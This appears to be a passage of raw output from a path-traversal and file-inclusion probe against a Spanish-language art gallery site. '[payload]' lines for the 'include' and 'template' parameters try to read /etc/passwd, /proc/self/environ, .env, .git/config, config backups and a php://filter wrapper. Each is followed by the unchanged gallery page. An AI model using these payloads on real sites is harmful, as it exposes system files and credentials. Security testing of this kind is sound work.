    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: template
[payload] template=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
